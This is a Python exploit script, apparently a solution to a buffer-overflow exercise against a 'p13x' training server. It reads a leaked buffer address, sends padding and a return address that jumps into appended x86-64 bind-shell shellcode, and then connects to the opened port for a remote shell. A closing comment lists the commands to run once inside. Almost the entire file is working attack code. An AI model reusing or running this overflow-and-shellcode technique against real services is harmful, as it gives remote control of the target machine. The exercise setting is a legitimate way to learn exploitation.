#!/usr/bin/python3

import struct  
import binascii
import time
import sys
import json
import binexpect


def rop(*args):  
    return struct.pack('Q'*len(args), *args)



target_host = "localhost" #"attack.samsclass.info"   #
target_port = "10100" #"13010"   #

setup = binexpect.setup("nc "+ target_host + " " + target_port)
s7 = setup.target()
s7.setecho(False)

s7.tryexpect("Welcome to the p13x Server! buffer = (.*)\nEnter string \(q to quit\)")
buf_addr = int(str(s7.match.group(1), 'utf-8'), 16)
print ("BUF ADDR: " + hex(buf_addr))

def get_shellcode(port):

    # simple tcp bind shell, ripped from: http://shell-storm.org/shellcode/files/shellcode-858.php
    
    hexcode = "6a025f6a015e6a065a6a29580f054989c04d31d241524152c604240266c7442402PORT4889e641505f6a105a6a31580f0541505f6a015e6a32580f054889e66a104889e241505f6a2b580f054889c76a035e48ffce6a21580f0575f64831f64831d248bf2f2f62696e2f736848c1ef0857545f6a3b580f05"
    # render the port to BIG endian

    hexport = str(binascii.hexlify(bytearray([ (port >> 8) & 0xff, port & 0xff])), 'utf-8')

    # inject the port in the shellcode

    return binascii.unhexlify(bytes(hexcode.replace("PORT",hexport), 'utf-8'))


def send_shellcode(shellcode, buf_addr):

    # initial padding to fill the buffer and
    # the saved frame pointer
    payload = bytes('A' * (0x2b0 + 8), 'utf-8')

    payload += rop(
        buf_addr+0x2b0+8+8, # return to shellcode
        )

    s7.sendbinline(payload + shellcode)


# spawn the shell on target host
shellcode = get_shellcode(6564)
send_shellcode(shellcode, buf_addr)

# connect to the shell
setup2 = binexpect.setup("nc "+ target_host + " 6564")
shell = setup2.target()
shell.setecho(False)

shell.pwned()

"""
type this into the shell:

echo mrmacete >> /home/p13x/winners
touch /home/p13x/updatenow
"""



